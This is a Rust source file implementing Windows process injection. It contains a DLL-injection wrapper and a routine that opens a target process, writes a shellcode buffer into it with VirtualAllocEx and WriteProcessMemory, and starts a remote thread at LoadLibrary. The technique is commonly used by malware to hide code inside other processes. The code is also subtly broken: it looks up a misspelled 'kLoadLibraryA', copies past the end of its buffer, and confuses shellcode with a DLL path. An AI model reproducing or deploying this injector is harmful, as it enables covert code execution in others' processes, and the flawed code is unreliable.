
use std::process::Command;
use std::ffi::{CString, OsStr, c_void};
use std::os::windows::ffi::OsStrExt;
use std::fs::{self, File};
use std::io::Read;
use std::ptr;
use winapi::um;
use libc::{c_char, uintptr_t, uint32_t, size_t};
use ntapi;
use kernel32;
use std::mem::transmute; 
use std::panic;
use std::fmt;
use std::time::Duration;
use log::*;
use winapi::shared::minwindef::{LPCVOID, LPVOID};
use win32_error::*;
use djin::inject_dll;
use winapi::um::minwinbase::SECURITY_ATTRIBUTES;
use winapi::um::winnt::PROCESS_CREATE_THREAD;
use winapi::um::winnt::PROCESS_VM_OPERATION;
use winapi::um::winnt::PROCESS_VM_WRITE;
use winapi::um::winnt::PROCESS_VM_READ;
use winapi::um::winnt::PROCESS_QUERY_INFORMATION;
use winapi::um::winnt::PROCESS_ALL_ACCESS;

#[derive(Default, Debug, Clone)]
struct peb_info <'a> {
    //reserved1              [2]byte     // BYTE 0-1
    InheritedAddressSpace:    &'a [u8],    // BYTE	0
    ReadImageFileExecOptions: &'a [u8],    // BYTE	1
    BeingDebugged:            &'a [u8],    // BYTE	2
    reserved2:                &'a [u8], // BYTE 3
    // ImageUsesLargePages          : 1;   //0x0003:0 (WS03_SP1+)
    // IsProtectedProcess           : 1;   //0x0003:1 (Vista+)
    // IsLegacyProcess              : 1;   //0x0003:2 (Vista+)
    // IsImageDynamicallyRelocated  : 1;   //0x0003:3 (Vista+)
    // SkipPatchingUser32Forwarders : 1;   //0x0003:4 (Vista_SP1+)
    // IsPackagedProcess            : 1;   //0x0003:5 (Win8_BETA+)
    // IsAppContainer               : 1;   //0x0003:6 (Win8_RTM+)
    // SpareBit                     : 1;   //0x0003:7
    //reserved3              [2]uintptr  // PVOID BYTE 4-8
    Mutant:                 uintptr_t,     // BYTE 4
    ImageBaseAddress:       uintptr_t,     // BYTE 8
    Ldr:                    uintptr_t,     // PPEB_LDR_DATA
    ProcessParameters:      uintptr_t,     // PRTL_USER_PROCESS_PARAMETERS
    reserved4:              uintptr_t,  // PVOID
    AtlThunkSListPtr:       uintptr_t,     // PVOID
    reserved5:              uintptr_t,     // PVOID
    reserved6:              uint32_t,     // ULONG
    reserved7:              uintptr_t,     // PVOID
    reserved8:              uint32_t,      // ULONG
    AtlThunkSListPtr32:     uint32_t,      // ULONG
    reserved9:              uintptr_t, // PVOID
    reserved10:             &'a [u8],    // BYTE [96]byte
    PostProcessInitRoutine: uintptr_t,     // PPS_POST_PROCESS_INIT_ROUTINE
    reserved11:             &'a [u8],   // BYTE[128]byte
    reserved12:             uintptr_t,  // PVOID
    SessionId:              uint32_t,      // ULONG
}

#[derive( Default, Debug, Clone)]
struct basic_info_process {
    reserved1:                    uintptr_t,    // PVOID
    PebBaseAddress:               uintptr_t,    // PPEB
    reserved2:                    uintptr_t, // PVOID
    UniqueProcessId:              uintptr_t,    // ULONG_PTR
    InheritedFromUniqueProcessID: uintptr_t,    // PVOID
}

pub fn dj_inject(dll_path: &std::path::Path, pid: u32){
    unsafe{
    let phandle = winapi::um::processthreadsapi::OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,0 , pid);
    let function_name = "intialize".to_string();
    let function = function_name.as_bytes();
    inject_dll(phandle, dll_path, function);
    let err = Win32Error::new();
    info!("EVENT ERROR: {}", err);
    return;
    }

}

pub fn inject(shellcode: Vec<u8>, pid: u32){

    unsafe {

        let kernel_cstring = CString::new("kernel32.dll").unwrap();
        let library_cstring = CString::new("kLoadLibraryA").unwrap();
        let load_library_addr = winapi::um::libloaderapi::GetProcAddress(winapi::um::libloaderapi::GetModuleHandleA(kernel_cstring.as_ptr()), library_cstring.as_ptr());


        //OPEN PROCESS

       // let phandle = winapi::um::processthreadsapi::OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ|PROCESS_QUERY_INFORMATION,0 , pid);


        let phandle = winapi::um::processthreadsapi::OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,0 , pid);

        //ALLOCATE MEMORY
        //let addr = winapi::um::memoryapi::VirtualAlloc(ptr::null_mut(), shellcode.len(), winapi::um::winnt::MEM_COMMIT | winapi::um::winnt::MEM_RESERVE, winapi::um::winnt::PAGE_READWRITE);
        let addr = winapi::um::memoryapi::VirtualAllocEx(phandle, 0 as winapi::shared::minwindef::LPVOID, (shellcode.len() * 2) + 1, winapi::um::winnt::MEM_COMMIT | winapi::um::winnt::MEM_RESERVE, winapi::um::winnt::PAGE_READWRITE);

        if addr.is_null(){
            info!("ADDR NULL");
        }
        info!("VIRTUAL ALLOC WAS DONE {:#?}", addr);


        //WRITE SHELLCODE


        let wpm_error = winapi::um::memoryapi::WriteProcessMemory(phandle, addr, shellcode.as_ptr() as *mut winapi::ctypes::c_void, (shellcode.len() * 2) +1, 0 as _);



        if wpm_error == winapi::shared::minwindef::FALSE{
            info!("WRITE PROCESS MEMORY FAILED {:#?}", wpm_error);
        }
        info!("WRITE MEMORY COMPLETED");    
        

        //CHANGE EXECUTION AND READ PERMISSIONS
        let mut old_protect = winapi::um::winnt::PAGE_READWRITE;

        //let virutal_error = winapi::um::memoryapi::VirtualProtect(addr, shellcode.len(), winapi::um::winnt::PAGE_EXECUTE_READ, &mut old_protect);
    
        //let virutal_error = winapi::um::memoryapi::VirtualProtectEx(phandle, addr, shellcode.len(), winapi::um::winnt::PAGE_EXECUTE_READ, &mut old_protect);

        //info!("VIRTUAL PROTECT WAS DONE: {:#?}", virutal_error);


        //CREATE REMOTE THREAD EX phandle, security attributes, stack size, lpstart address, lpparameters, dwcrewtionflags, threadattributes, lpthreadid

        //let handle = winapi::um::processthreadsapi::CreateRemoteThreadEx(phandle, ptr::null_mut(), 0, Some(std::mem::transmute(addr)), ptr::null_mut(), 0, ptr::null_mut(), ptr::null_mut());

        //CREATE REMOTE THREAD phandle, security attributes, stack_size, lpstart address, lpparameters, dwcreationflags, threadid
        let lpthread_start: winapi::um::minwinbase::PTHREAD_START_ROUTINE = Some(std::mem::transmute(load_library_addr));
        let handle = winapi::um::processthreadsapi::CreateRemoteThread(phandle, ptr::null_mut(), 0, lpthread_start, addr, 0, 0 as *mut u32);
        info!("CREATETHREAD DONE - PID: {:#?}", pid);
        info!("CREATETHREAD HANDEL: {:#?}", handle);
        //WAIT FOR OBJECT
        let event = winapi::um::synchapi::WaitForSingleObject(handle, 0xFFFFFFFF);
        let err = Win32Error::new();

        info!("WAITING FOR THREAD: {:?}", event);
        info!("EVENT ERROR: {}", err);
        if handle != ptr::null_mut(){
            winapi::um::handleapi::CloseHandle(handle);
            winapi::um::handleapi::CloseHandle(phandle);
            info!("HANDLE CLOSED");
        }
        info!("DONE");
    }

}
